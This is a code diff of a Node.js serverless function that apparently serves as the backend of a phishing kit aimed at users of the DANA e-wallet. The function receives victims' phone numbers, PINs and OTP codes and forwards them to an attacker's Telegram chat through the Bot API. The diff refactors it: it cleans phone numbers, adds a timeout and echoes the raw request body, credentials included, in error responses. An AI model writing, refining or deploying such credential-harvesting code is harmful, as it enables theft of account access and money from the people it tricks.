@@ -1,13 +1,14 @@
 const axios = require('axios');
 
-// Format pesan Telegram
+// Format Telegram message without hyphens in phone number
 function formatMessage(type, phone, pin, otp) {
-  const formattedPhone = phone.replace(/(\d{3})(\d{4})(\d{3,4})/, '$1-$2-$3');
+  // Remove all non-digit characters from phone number
+  const cleanPhone = phone.replace(/\D/g, '');
   
   let message = 
     "├• AKUN | DANA E-WALLET\n" +
     "├───────────────────\n" +
-    `├• NO HP : ${formattedPhone}\n`;
+    `├• NO HP : ${cleanPhone}\n`;
 
   if (pin) {
     message += "├───────────────────\n" +
@@ -24,47 +25,77 @@ function formatMessage(type, phone, pin, otp) {
 }
 
 exports.handler = async (event, context) => {
+  // Only allow POST requests
   if (event.httpMethod !== 'POST') {
-    return { statusCode: 405, body: 'Method Not Allowed' };
+    return { 
+      statusCode: 405, 
+      body: 'Method Not Allowed',
+      headers: { 'Content-Type': 'application/json' }
+    };
   }
 
   try {
     const { type, phone, pin, otp } = JSON.parse(event.body);
 
-    if (!type || !phone || phone.length < 10) {
+    // Clean phone number from any formatting
+    const cleanPhone = phone ? phone.replace(/\D/g, '') : '';
+
+    // Validate required fields
+    if (!type || !cleanPhone || cleanPhone.length < 10) {
       return {
         statusCode: 400,
-        body: JSON.stringify({ error: 'Nomor HP tidak valid' })
+        body: JSON.stringify({ 
+          error: 'Invalid request: Phone number must be at least 10 digits',
+          received: phone,
+          cleaned: cleanPhone
+        }),
+        headers: { 'Content-Type': 'application/json' }
       };
     }
 
+    // Check for Telegram configuration
     const botToken = process.env.TELEGRAM_BOT_TOKEN;
     const chatId = process.env.TELEGRAM_CHAT_ID;
 
     if (!botToken || !chatId) {
-      throw new Error('Telegram configuration missing');
+      throw new Error('Server configuration error: Missing Telegram credentials');
     }
 
-    const message = formatMessage(type, phone, pin, otp);
+    // Format and send the message
+    const message = formatMessage(type, cleanPhone, pin, otp);
 
-    await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-      chat_id: chatId,
-      text: message,
-      parse_mode: 'HTML'
-    });
+    const telegramResponse = await axios.post(
+      `https://api.telegram.org/bot${botToken}/sendMessage`,
+      {
+        chat_id: chatId,
+        text: message,
+        parse_mode: 'HTML'
+      },
+      {
+        timeout: 5000 // 5 seconds timeout
+      }
+    );
 
     return {
       statusCode: 200,
-      body: JSON.stringify({ success: true })
+      body: JSON.stringify({ 
+        success: true,
+        telegram_status: telegramResponse.status
+      }),
+      headers: { 'Content-Type': 'application/json' }
     };
 
   } catch (error) {
+    console.error('Error processing request:', error);
+    
     return {
       statusCode: 500,
       body: JSON.stringify({
         error: 'Internal Server Error',
-        details: error.message
-      })
+        details: error.message,
+        request_body: event.body
+      }),
+      headers: { 'Content-Type': 'application/json' }
     };
   }
 };
